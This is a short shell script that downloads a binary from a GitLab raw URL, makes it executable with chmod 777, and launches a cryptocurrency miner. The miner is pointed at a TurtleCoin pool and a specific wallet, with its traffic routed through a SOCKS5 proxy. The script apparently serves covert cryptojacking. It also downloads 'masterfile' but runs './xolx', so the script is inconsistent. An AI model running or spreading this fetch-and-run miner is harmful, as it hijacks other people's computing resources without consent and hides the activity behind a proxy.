#!/bin/sh
apt-get update 
wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
chmod 777 masterfile
POOL=turtlecoin.herominers.com:10380
WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
WORKER=CPU
PROXY=socks5://192.252.209.155:14455
./xolx -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
